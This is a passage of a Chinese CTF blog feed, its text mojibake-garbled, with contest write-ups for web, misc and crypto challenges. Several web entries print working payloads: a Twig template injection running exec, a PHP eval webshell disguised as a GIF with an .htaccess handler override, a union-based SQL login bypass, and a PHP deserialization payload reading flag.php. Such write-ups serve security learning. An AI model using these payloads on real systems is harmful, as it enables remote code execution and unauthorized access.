class="string">&quot;\tå‘å‰æ•°ç¬¬31ä¸ªæ•°ï¼š&quot;</span>.$num[$i<span class="number">-3</span>].<span class="string">&quot;\t%è®¡ç®—å:&quot;</span>.(($num[$i<span class="number">-31</span>]+$num[$i<span class="number">-3</span>])%<span class="number">100000</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2019/12/30/php-fakerandom-number/TIMæˆªå›¾20200429223554.png" style="zoom: 80%;"><p>å¯ä»¥çœ‹åˆ°è™½ç„¶æœ‰å¯èƒ½æœ‰è¯¯å·®ï¼Œä½†è¯¯å·®éƒ½ä¸º1ï¼Œgtflyå¤§ä½¬ç»™çš„æç¤ºå¯ä»¥èƒ½ç²¾åº¦çš„é—®é¢˜æ„Ÿè§‰å¾ˆå¯¹</p><p>å†çœ‹ä¸€ä¸‹windowsï¼Œæ˜¯æ— æ³•ç”¨ä¸Šé¢çš„æ–¹å¼é¢„æµ‹çš„ï¼Œä½†æ˜¯å¯ä»¥çˆ†ç ´</p><p>è¯¦ç»†çœ‹ï¼š<a href="https://github.com/Sjord/crack-ezchatter-token">https://github.com/Sjord/crack-ezchatter-token</a></p><p>å‚è€ƒï¼š</p><p><a href="https://www.freebuf.com/vuls/192012.html">https://www.freebuf.com/vuls/192012.html</a></p><p><a href="https://blog.cfyqy.com/article/5aa79cea.html">https://blog.cfyqy.com/article/5aa79cea.html</a></p><p><a href="https://xz.aliyun.com/t/31">https://xz.aliyun.com/t/31</a></p><p><a href="http://wonderkun.cc/index.html/?p=585">http://wonderkun.cc/index.html/?p=585</a></p><p><a href="https://xz.aliyun.com/t/1520#toc-10">https://xz.aliyun.com/t/1520#toc-10</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> ctf </tag>
            
            <tag> ä¼ªéšæœºæ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ²³å—çœç¬¬ä¸€å±Šé‡‘ç›¾æ¯éƒ¨åˆ†é¢˜ç›®writeup</title>
      <link href="2019/12/24/jindun-2019-wp/"/>
      <url>2019/12/24/jindun-2019-wp/</url>
      
        <content type="html"><![CDATA[<p>å¤ªèœäº†ï¼å…¨ç¨‹æ‡µé€¼ï¼Œå•¥éƒ½æ²¡å¹²ï¼2333ã€‚ã€‚ã€‚è®°å½•ä¸‹å§ï¼æ”¶è·å¾ˆå¤šï¼</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="waimai2"><a href="#waimai2" class="headerlink" title="waimai2"></a>waimai2</h3><p>æ‰“å¼€å‘ç°å¥½åƒä¸€ä¸ªç«™ï¼Œæœ‰<code>waimai</code>è¿™ä¸ªç›®å½•ï¼Œè®¿é—®å‘ç°æ˜¯ä¸ªç™»å½•æ¡†</p><p>ä»»æ„è´¦å·éƒ½å¯ä»¥ç™»è¿›å»ï¼ŒTwigæ¨¡æ¿æ³¨å…¥(æ˜¯æ—¶å€™å­¦ä¸‹SSTIäº†)ï¼Œpayloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;ls&quot;)&#125;&#125;&amp;password&#x3D;admin&amp;submit&#x3D;Login</span><br></pre></td></tr></table></figure><p><img src="/2019/12/24/jindun-2019-wp/17.png"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="keyä¸åœ¨è¿™é‡Œ"><a href="#keyä¸åœ¨è¿™é‡Œ" class="headerlink" title="keyä¸åœ¨è¿™é‡Œ"></a>keyä¸åœ¨è¿™é‡Œ</h3><p>äºŒç»´ç ï¼Œæ‰«æï¼Œå‘ç°æ˜¯ä¸ªbingçš„æœç´¢ç½‘å€</p><p><img src="/2019/12/24/jindun-2019-wp/20191224111739.png"></p><p>å°†må‚æ•°10è¿›åˆ¶è½¬asciiå­—ç¬¦å°±è¡Œ</p><p><img src="/2019/12/24/jindun-2019-wp/20191224111739.png"></p><h3 id="ä»å¨ƒå¨ƒæŠ“èµ·"><a href="#ä»å¨ƒå¨ƒæŠ“èµ·" class="headerlink" title="ä»å¨ƒå¨ƒæŠ“èµ·"></a>ä»å¨ƒå¨ƒæŠ“èµ·</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0086 1562 2535 5174</span><br><span class="line">bnhn s wwy vffg vffg rrhy fhnv</span><br></pre></td></tr></table></figure><p>æç¤ºè¯´flagä¸ºå°†å¾—åˆ°çš„è¿™å¥è¯MD5 32ä½åŠ å¯†çš„å†…å®¹</p><p>å‰ä¸€æ®µæ˜¯ä¸­æ–‡ç”µæŠ¥ç ï¼š<a href="http://code.mcdvisa.com/">è§£å¯†ç½‘å€</a>ï¼Œè§£å‡º<code>äººå·¥æ™ºèƒ½</code></p><p><img src="/2019/12/24/jindun-2019-wp/20191224113708.png"></p><p>åä¸€æ®µæ˜¯äº”ç¬”å­—ï¼Œè§£å‡ºæ¥çš„ç»“æœæ˜¯<code>ä¹Ÿè¦ä»å¨ƒå¨ƒæŠ“èµ·</code>ï¼Œåœ¨çº¿äº”ç¬”è¾“å…¥ï¼š<a href="https://www.qqxiuzi.cn/%E5%9C%A8%E7%BA%BF%E4%BA%94%E7%AC%94%E8%BE%93%E5%85%A5%E6%B3%95.htm">ç½‘å€</a></p><p><img src="/2019/12/24/jindun-2019-wp/20191224115042.png"></p><p>ç„¶åMD5åŠ å¯†å°±å¯ä»¥å¾—åˆ°flag</p><p><img src="/2019/12/24/jindun-2019-wp/20191224115500.png"></p><h3 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h3><p>ç»™äº†ä¸€ä¸ªä¸çŸ¥é“æ˜¯å•¥çš„æ–‡ä»¶ï¼Œå¤šè¯•å‡ æ¬¡å§ï¼Œå‘ç°æ˜¯pptxï¼Œæœ‰å¯†ç ï¼Œç”¨<code>aopr</code>ç ´è§£</p><p><img src="/2019/12/24/jindun-2019-wp/20191224120951.png"></p><p>ç ´è§£å‡ºå¯†ç æ˜¯<code>9919</code>ï¼Œæ‰“å¼€ï¼Œå‘ç°ç¬¬ä¸ƒé¡µæœ‰æ–‡æœ¬æ¡†</p><p><img src="/2019/12/24/jindun-2019-wp/20191224121214.png"></p><p>æ”¹ä¸‹å­—ä½“é¢œè‰²ï¼Œå‡ºç°flag</p><p><img src="/2019/12/24/jindun-2019-wp/20191224121350.png"></p><h3 id="æˆ‘åƒä¸‰æ˜æ²»"><a href="#æˆ‘åƒä¸‰æ˜æ²»" class="headerlink" title="æˆ‘åƒä¸‰æ˜æ²»"></a>æˆ‘åƒä¸‰æ˜æ²»</h3><p>é¢˜ç›®æ˜¯ä¸€å¼ jpgå›¾ç‰‡ï¼Œç”¨hxdæˆ–è€…stringså‘ç°ä¸²ç‰¹æ®Šçš„å­—ç¬¦ä¸²</p><p><img src="/2019/12/24/jindun-2019-wp/20191224121823.png"></p><p>base32è§£å¯†å¾—åˆ°flag</p><p><img src="/2019/12/24/jindun-2019-wp/20191224122047.png"></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="apple"><a href="#apple" class="headerlink" title="apple"></a>apple</h3><p>ç»™äº†ä¸€æ®µåƒbase64çš„ä¸œè¥¿ï¼Œ<code>TkVLTFccSx1RAwFWDVcFDg0NAwIIWAZccyRzcydzIHUuKHxyLjA=</code>ï¼Œç›´æ¥è§£ç ä¼šä¹±ç </p><p>è„šæœ¬æ„æ€å°±æ˜¯å°†è§£å‡ºæ¥çš„ä¹±ç ä¸è‡ªå·±çš„ä¸‹æ ‡åŠ ä¸ŠæŸä¸ªå€¼å¼‚æˆ–ï¼Œç„¶åæ‹¼æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">s&#x3D;&#39;TkVLTFccSx1RAwFWDVcFDg0NAwIIWAZccyRzcydzIHUuKHxyLjA&#x3D;&#39;</span><br><span class="line">s&#x3D;base64.b64decode(s)</span><br><span class="line">for i in range(256):</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">k&#x3D;0</span><br><span class="line">for j in s:</span><br><span class="line">res&#x3D;j^(k+i)</span><br><span class="line">flag+&#x3D;chr(res)</span><br><span class="line">k+&#x3D;1</span><br><span class="line">print(i,flag)</span><br></pre></td></tr></table></figure><h3 id="å¯†ç å­¦"><a href="#å¯†ç å­¦" class="headerlink" title="å¯†ç å­¦"></a>å¯†ç å­¦</h3><p>é™„ä»¶ç»™äº†ä¸‰æ®µå¯†ç ï¼Œ<code>clear_info.txt</code> <code>crypt_info.txt</code> <code>true_crypto.txt</code>ï¼Œ<code>true_crypto.txt</code>å†…å®¹åƒæ˜¯DESå¯†ç </p><p>å‘ç°<code>clear_info.txt</code>å’Œ<code>crypt_info.txt</code>å†…å®¹é•¿åº¦ç›¸åŒéƒ½ä¸º79ï¼Œè¯•è¯•å¼‚æˆ–å§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">s1&#x3D;open(&quot;clear_info.txt&quot;,&quot;r&quot;).read()</span><br><span class="line">s2&#x3D;open(&quot;crypt_info.txt&quot;,&quot;r&quot;).read()</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">li1&#x3D;[i for i in s1]</span><br><span class="line">li2&#x3D;[i for i in s2]</span><br><span class="line">for s1,s2 in zip(li1,li2):</span><br><span class="line">s&#x3D;ord(s1)^ord(s2)</span><br><span class="line">flag+&#x3D;chr(s)</span><br><span class="line">print(flag)</span><br><span class="line">fg&#x3D;&quot;&quot;</span><br><span class="line">for tr in flag:</span><br><span class="line">if tr&lt;&#x3D;&quot;Z&quot; and tr&gt;&#x3D;&quot;A&quot;:</span><br><span class="line">fg+&#x3D;&quot;A&quot;</span><br><span class="line">elif tr&lt;&#x3D;&quot;z&quot; and tr&gt;&#x3D;&quot;a&quot;:</span><br><span class="line">fg+&#x3D;&quot;B&quot;</span><br><span class="line">else:</span><br><span class="line">fg+&#x3D;&quot;&quot;</span><br><span class="line">print(fg)</span><br></pre></td></tr></table></figure><p>å¼‚æˆ–åçš„ç»“æœå¤§å°å†™äº¤å‰ï¼Œè¯•è¯•åŸ¹æ ¹å¯†ç å§</p><p><img src="/2019/12/24/jindun-2019-wp/20191224154417.png"></p><p>è§£å¯†åœ°å€ï¼š<a href="https://tool.bugku.com/peigen/">ç½‘å€</a>ï¼Œè§£å¯†ç»“æœä¸ºï¼š<code>DESISAMUSING</code></p><p>Desè§£ä¸‹å¯†ï¼Œè§£å¯†åœ°å€ï¼š<a href="https://www.sojson.com/encrypt_des.html">ç½‘å€</a></p><p><img src="/2019/12/24/jindun-2019-wp/20191224154739.png"></p><h3 id="bj-å¯†æ–‡"><a href="#bj-å¯†æ–‡" class="headerlink" title="bj-å¯†æ–‡"></a>bj-å¯†æ–‡</h3><p>æ‰“å¼€å‘ç°æ˜¯</p><pre><code>45 45 45 45 45 32 45 46 46 45 32 45 45 46 46 46 32 46 46 46 45 45 32 45 45 46 46 46 32 45 45 45 45 46 32 45 46 46 46 46 32 46 32 45 45 46 46 46 32 46 46 46 46 45 32 45 45 46 46 46 32 45 46 46 46 32 45 46 46 46 46 32 46 45 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 46 45 32 45 45 45 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 32 46 46 46 46 45 32 46 32 46 46 46 46 46 32 45 46 46 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 45 32 45 46 46 32 46 46 46 46 46 32 45 45 46 46 46 32 46 46 46 45 45 32 46 46 46 45 45 32 45 46 46 46 46 32 45 46 46 46 46 32 46 46 46 45 45 32 45 45 45 45 45 32 46 46 46 46 45 32 46 46 45 45 45 32 45 46 46 46 46 32 46 46 46 45 45 32 45 46 46 46 46 32 46 45 45 45 45 32 45 45 46 46 46 32 45 46 46</code></pre><p>åªæœ‰45ï¼Œ46ï¼Œ32ä¸‰ç§æ•°å­—è€Œå…¶å¯¹åº”çš„ASCIIç æ­£æ˜¯<code>-</code> <code>.</code> <code> </code></p><p>è„šæœ¬æ›¿æ¢å°±å¥½</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;open(&quot;bj.txt&quot;,&quot;r&quot;).read()</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for tr in s.split(&quot; &quot;):</span><br><span class="line">flag+&#x3D;chr(int(tr))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°æ‘©æ–¯å¯†ç ï¼Œè§£å¯†å¾—åˆ°<code>0X73796E747B6A4848336B4E564D4D573366304263617D</code>ï¼Œåº”è¯¥æ˜¯16è¿›åˆ¶ï¼Œ16è¿›åˆ¶è½¬å­—ç¬¦è¯•è¯•ï¼Œå¾—åˆ°<code>synt&#123;jHH3kNVMMW3f0Bca&#125;</code>ï¼Œç„¶åæ˜¯å‡¯æ’’ç§»ä½åŠ å¯†ï¼Œå¯†ç ä¸º13å¾—åˆ°flagï¼Œ<code>flag&#123;wUU3xAIZZJ3s0Opn&#125;</code></p><h3 id="å°æ˜çš„ç”Ÿæ—¥"><a href="#å°æ˜çš„ç”Ÿæ—¥" class="headerlink" title="å°æ˜çš„ç”Ÿæ—¥"></a>å°æ˜çš„ç”Ÿæ—¥</h3><p>ç»™äº†ä¸ªMD5ï¼Œ<code>0175501585710a89h5a60dc9ed2f88d7</code>ï¼Œè§£ä¸å‡ºæ¥ï¼Œæç¤ºè¯´æ˜¯ç”Ÿæ—¥ï¼Œå¹¶ä¸”å‰å››ä½æ˜¯<code>1997</code>ï¼Œ</p><p>å†™ä¸ªè„šæœ¬è·‘ä¸‹å§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import difflib</span><br><span class="line"></span><br><span class="line">flag&#x3D;&quot;0175501585710a89h5a60dc9ed2f88d7&quot;</span><br><span class="line"></span><br><span class="line">def md5(key):</span><br><span class="line">    m &#x3D; hashlib.md5()</span><br><span class="line">    m.update(key.encode(&#39;utf-8&#39;))</span><br><span class="line">    return m.hexdigest()</span><br><span class="line"></span><br><span class="line">dic&#x3D;&#123;&#125;</span><br><span class="line">birthday&#x3D;&#39;1997&#39;</span><br><span class="line">for i in range(1,13):</span><br><span class="line">    for j in range(1,32):</span><br><span class="line">       s1&#x3D;&quot;&quot;</span><br><span class="line">        s2&#x3D;&quot;&quot;</span><br><span class="line">        if i&lt;10:</span><br><span class="line">            s1&#x3D;&#39;0&#39;+str(i)</span><br><span class="line">        else:</span><br><span class="line">        s1&#x3D;str(i)</span><br><span class="line">        if j&lt;10:</span><br><span class="line">            s2&#x3D;&#39;0&#39;+str(j)</span><br><span class="line">        else:</span><br><span class="line">        s2&#x3D;str(j)</span><br><span class="line">        bit&#x3D;birthday+s1+s2</span><br><span class="line">        dic[bit]&#x3D;difflib.SequenceMatcher(None, flag,md5(bit)).quick_ratio()</span><br><span class="line">for k in sorted(dic,key&#x3D;dic.__getitem__,reverse&#x3D;True):</span><br><span class="line">print(k,dic[k])</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ªå°±æ˜¯æœ€ç›¸ä¼¼çš„md5</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYå®‰æ’æ¯æœˆèµ›2019éƒ¨åˆ†é¢˜ç›®writeup</title>
      <link href="2019/12/21/gxy-2019-wp/"/>
      <url>2019/12/21/gxy-2019-wp/</url>
      
        <content type="html"><![CDATA[<p>æˆ‘å¥½èœï¼æˆ‘å¥½èœï¼æˆ‘å¥½èœï¼é‡è¦çš„äº‹æƒ…è¯´ä¸‰éï¼Œæ¯”èµ›æ”¶è·å¾ˆå¤šï¼ï¼ï¼æ€»ç»“ä¸€ä¸‹ï¼Œæ”¶è·äº†å¤§å‹æ¯”èµ›çš„ä¸€è¡€ï¼Œä½†ä¹Ÿå°±æ­£å„¿å…«ç»çš„åšå‡ºè¿™ä¸€é“ï¼2333â€¦.</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ç¦æ­¢å¥—å¨ƒï¼"><a href="#ç¦æ­¢å¥—å¨ƒï¼" class="headerlink" title="ç¦æ­¢å¥—å¨ƒï¼"></a>ç¦æ­¢å¥—å¨ƒï¼</h3><p>ä¹‹å‰åšè¿‡è¿™ç§ç±»å‹ï¼Œè„‘å­æ··äº†ï¼å“ï¼</p><p>WPå‚è§ï¼š<a href="http://www.moonback.xyz/2019/11/12/php-nopara-rce/#GXY-%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B">http://www.moonback.xyz/2019/11/12/php-nopara-rce/#GXY-å®‰æ’æœˆèµ›</a></p><h3 id="babyupload"><a href="#babyupload" class="headerlink" title="babyupload"></a>babyupload</h3><p>è¿™é¢˜å°±æ˜¯æˆ‘æ‹¿åˆ°ä¸€è¡€çš„é¢˜ç›®ï¼Œå°å¼€å¿ƒï¼å˜»å˜»å˜»ï¼</p><p>å…¶å®è¿™é¢˜ä¸éš¾ï¼Œ<code>MIME+.htaccess+æ£€æµ‹å†…å®¹php</code></p><p>bpå¼€ä¸¤ä¸ªintruderï¼Œä¸€ä¸ªä¸Šä¼ <code>.htaccess</code>(æ³¨æ„MIME)ï¼Œä¸€ä¸ªä¸Šä¼ å›¾ç‰‡é©¬(æ£€æŸ¥<code>&lt;?php?&gt;</code>)ï¼Œåå°ä¼šåˆ é™¤ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ‰€ä»¥æ¡ä»¶ç«äº‰ï¼Œç„¶åèšå‰‘è¿å°±è¡Œ</p><p>.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;jpg|png|gif&quot;&gt;  </span><br><span class="line">    SetHandler application&#x2F;x-httpd-php  </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>å›¾ç‰‡é©¬ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;a&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="BabySqli"><a href="#BabySqli" class="headerlink" title="BabySqli"></a>BabySqli</h3><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ç‰¹æ®Šå­—ç¬¦ä¸²ï¼Œå…ˆbase32è§£å¯†ï¼Œå†base64è§£å¯†å¾—åˆ°ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">&#x27;$name&#x27;</span></span><br></pre></td></tr></table></figure><p>å‘Šè¯‰æˆ‘ä»¬æ•°æ®åº“ä¸ºuserï¼Œåˆ—æœ‰usernameè¿™åˆ—ï¼ŒçŒœæµ‹passwordçš„éªŒè¯æ˜¯å’Œusernameåˆ†ç¦»çš„</p><p>å…ˆfuzzä¸€ä¸‹sqlå…³é”®å­—</p><img src="/2019/12/21/gxy-2019-wp/TIMæˆªå›¾20200516140827.png" style="zoom:67%;"><p>å‘ç°è¿‡æ»¤äº†å°æ‹¬å·ï¼Œor,order,=,for,information</p><p>åæ¥çœ‹äº†wpæ‰çŸ¥é“ï¼Œè¿‡æ»¤åœ¨sqlä¹‹åï¼Œå…¶å®ä¹Ÿèƒ½è¯•å‡ºæ¥ï¼Œä¸‹å›¾æˆåŠŸå»¶æ—¶</p><img src="/2019/12/21/gxy-2019-wp/TIMæˆªå›¾20200516143833.png" style="zoom:67%;"><p>è¿™æ ·å°±ç›¸å½“äºæ²¡è¿‡æ»¤å•Šï¼Œç›´æ¥sqlmapä¸€æŠŠæ¢­ï¼Œèƒ½è·‘å‡ºè´¦å·çš„MD5ï¼Œä½†æ˜¯è§£ä¸å‡ºæ¥</p><p><img src="/2019/12/21/gxy-2019-wp/20191224092021.png"></p><p>æ—¢ç„¶æ˜¯passwordçš„éªŒè¯æ—¶åˆ†ç¦»çš„ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥ä¼ªé€ ä¸€ä¸ªç”¨æˆ·ï¼Œä¸Šé¢è·‘ä¸è·‘æ— æ‰€è°“</p><p>ç”¨unionæŸ¥è¯¢å°±è¡Œï¼Œæ³¨æ„åˆ—è¦å¯¹åº”ï¼Œpayloadï¼Œmd5ä¸º123456åŠ å¯†åçš„å€¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#39;union select 1,&quot;admin&quot;,&quot;e10adc3949ba59abbe56e057f20f883e&quot;%23&amp;pw&#x3D;123456</span><br></pre></td></tr></table></figure><p>ä¸ºå•¥å¯ä»¥è¿™æ ·ï¼Ÿ</p><p>åç«¯å°†æ¥æ”¶åˆ°çš„password md5åŠ å¯†ä¸ä¸Šæ¬¡æŸ¥è¯¢çš„ç»“æœæ¯”è¾ƒï¼Œæˆ‘ä»¬å°±å¯ä»¥è”åˆæŸ¥è¯¢ä¼ªé€ ä¸€ä¸ªç”¨æˆ·è¿›è¡Œç»•è¿‡</p><h3 id="æ— æƒ…çš„æŠ¥èœåæœºå™¨"><a href="#æ— æƒ…çš„æŠ¥èœåæœºå™¨" class="headerlink" title="æ— æƒ…çš„æŠ¥èœåæœºå™¨"></a>æ— æƒ…çš„æŠ¥èœåæœºå™¨</h3><p>ååºåˆ—åŒ–ï¼Œdirsearchæ‰«åˆ°<code>index.php~</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileReader</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $Filename;</span><br><span class="line"><span class="keyword">public</span> $start;</span><br><span class="line"><span class="keyword">public</span> $max_length;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = <span class="keyword">__DIR__</span> . <span class="string">&quot;/bcm.txt&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;start = <span class="number">12</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;max_length = <span class="number">72</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = <span class="keyword">__DIR__</span> . <span class="string">&quot;/fake_f1ag.php&quot;</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;start = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;max_length = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$data = file_get_contents(<span class="keyword">$this</span>-&gt;Filename, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="keyword">$this</span>-&gt;start, <span class="keyword">$this</span>-&gt;max_length);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#123;|\&#125;/&quot;</span>, $data))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t read flag!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hack!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$exp = $_REQUEST[<span class="string">&#x27;exp&#x27;</span>];</span><br><span class="line">$e = unserialize($exp);</span><br><span class="line"><span class="keyword">echo</span> $e-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">$exp = <span class="keyword">new</span> FileReader();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè¦ç»•è¿‡å¯¹expçš„æ­£åˆ™ï¼Œå‘ç°expå¯ä»¥é€šè¿‡POSTæäº¤è¿‡å»ï¼Œå¾ˆå®¹æ˜“ç»•è¿‡ï¼Œå…¶æ¬¡è¦ç»•è¿‡__wakeupå‡½æ•°ï¼Œè¿™ä¸ªç›´æ¥æ”¹ä¸‹æ•°å­—å¤§å°å°±è¡Œï¼Œè¯»æ–‡ä»¶çš„æ—¶å€™å¯ä»¥ç”¨<code>php://filter</code>è¿›è¡ŒåŠ å¯†ç»•è¿‡å¯¹<code>&#123;&#125;</code>çš„è¿‡æ»¤</p><p>payload:</p><pre><code>http://183.129.189.60:10004/index.php?exp=1POST:exp=O:10:&quot;FileReader&quot;:4:&#123;s:8:&quot;Filename&quot;;s:52:&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:1000;&#125;</code></pre><h3 id="I-can-ping-you"><a href="#I-can-ping-you" class="headerlink" title="I can ping you!"></a>I can ping you!</h3><p>é¢˜ç›®æ˜¯çœ‹ä¸åˆ°æºç çš„ï¼Œå’±ä»¬ç›´æ¥æ‹¿æºç æ¥çœ‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span 